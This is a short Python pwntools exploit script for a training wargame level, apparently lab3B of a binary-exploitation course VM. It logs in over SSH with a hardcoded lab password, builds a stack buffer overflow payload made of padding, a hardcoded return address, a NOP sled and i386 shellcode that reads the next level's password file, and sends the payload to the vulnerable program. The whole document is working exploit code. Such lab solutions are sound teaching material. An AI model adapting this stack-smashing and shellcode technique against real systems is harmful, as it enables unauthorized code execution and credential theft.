from pwn import *# pylint: disable=unused-wildcard-import
# pylint: disable=undefined-variable
# pylint: disable=no-member
context.log_level = 'debug'# pylint: disable=assigning-non-slot

#lab3B:th3r3_iz_n0_4dm1ns_0n1y_U!
ssh = ssh("lab3B","mbe.vm",password="th3r3_iz_n0_4dm1ns_0n1y_U!")

sc = asm(shellcraft.i386.cat("/home/lab3A/.pass"))
payload = "A"*156+p32(0xbffffcb0)+"\x90"*0x100+sc #156

sh = ssh.run("/bin/sh")
sh.sendline("/levels/lab03/lab3B")
sh.recvuntil("shellcode, k")
sh.sendline(payload)
sh.interactive()
